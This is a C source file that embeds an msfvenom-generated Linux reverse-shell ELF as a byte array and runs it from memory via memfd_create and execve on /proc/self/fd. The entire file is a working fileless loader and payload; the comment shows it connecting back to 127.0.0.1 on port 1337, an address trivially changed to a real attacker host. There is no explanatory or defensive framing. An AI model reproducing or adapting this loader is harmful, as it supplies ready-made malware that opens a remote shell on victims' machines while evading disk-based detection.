#define _GNU_SOURCE

#include <stdio.h>
#include <sys/mman.h>
#include <linux/memfd.h>
#include <stdlib.h>

// msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f elf
const char elf[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x2, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x3e, 0x0, 0x1, 0x0, 0x0, 0x0, 0x78, 0x0, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x38, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6a, 0x29, 0x58, 0x99, 0x6a, 0x2, 0x5f, 0x6a, 0x1, 0x5e, 0xf, 0x5, 0x48, 0x97, 0x48, 0xb9, 0x2, 0x0, 0x5, 0x39, 0x7f, 0x0, 0x0, 0x1, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0xf, 0x5, 0x6a, 0x3, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 0xf, 0x5, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x0, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0xf, 0x5
};

int main()
{
    int fd;
    char path[100];
    char **argv = { NULL };
    char **envp = { NULL };

    fd = memfd_create("memfd_file", MFD_CLOEXEC);
    if (fd < 0)
    {
        perror("memfd_create");
        exit(1);
    }

    write(fd, elf, sizeof(elf));

    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    if (execve(path, argv, envp) < 0)
    {
        perror("execve");
        exit(1);
    }

    return 0;
}
